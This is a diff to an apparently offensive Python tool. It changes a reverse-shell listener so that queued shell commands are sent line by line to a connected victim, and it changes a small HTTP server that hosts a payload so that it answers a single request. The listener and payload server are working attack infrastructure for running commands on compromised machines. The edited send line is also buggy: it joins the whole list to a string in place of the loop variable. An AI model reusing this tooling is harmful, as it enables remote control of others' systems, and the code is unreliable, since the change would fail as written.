@@ -24,9 +24,11 @@ def reverse_shell_listener():
 		conn, addr = s.accept() # Accept connections.
 		print("[+] Connected by", addr) # Print connected by ipaddress.
 		data = conn.recv(1024).decode("UTF-8") # Inital Connect
-		conn.send(bytes(shellcode, "UTF-8")) # Send shell command.
-		data = conn.recv(1024).decode("UTF-8") # Receive output from command.
-		print(data) # Print the output of the command.
+		codelines=shellcode.split("\n")
+		for line in codelines:
+			conn.send(bytes(codelines + "\n\r", "UTF-8")) # Send shell command.
+			data = conn.recv(1024).decode("UTF-8") # Receive output from command.
+			print(data) # Print the output of the command.
 	except KeyboardInterrupt: 
 		print("...listener terminated using [ctrl+c], Shutting down!")
 		exit() # Using [ctrl+c] will terminate the listener.
@@ -39,7 +41,7 @@ def payload():
 		os.chdir(web_dir)
 		httpHandler = http.server.SimpleHTTPRequestHandler
 		httpd = socketserver.TCPServer(('',8000),httpHandler)
-		httplistener=Process(target=httpd.serve_forever)
+		httplistener=Process(target=httpd.handle_request)
 		httplistener.start()
 	except:
 		httpd.shutdown()
